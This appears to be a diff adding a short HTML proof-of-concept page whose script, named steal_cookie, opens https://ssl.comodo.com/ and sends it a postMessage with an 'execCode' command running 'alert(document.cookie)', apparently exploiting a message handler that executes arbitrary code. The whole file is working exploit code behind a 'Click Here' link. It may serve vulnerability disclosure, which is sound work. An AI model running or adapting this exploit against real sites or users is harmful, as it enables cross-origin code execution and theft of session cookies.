@@ -1,0 +1,18 @@
+&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;
+function steal_cookie(obj)
+{
+    // Wait for the page to load
+    setTimeout(function() {
+        obj.postMessage(JSON.stringify({
+            command: &quot;execCode&quot;,
+            code:    &quot;alert(document.cookie)&quot;,
+        }), &quot;*&quot;);
+    }, 2000);
+}
+&lt;/script&gt;
+&lt;a href=&quot;javascript:steal_cookie(window.open(&#39;https://ssl.comodo.com/&#39;))&quot;&gt;Click Here&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
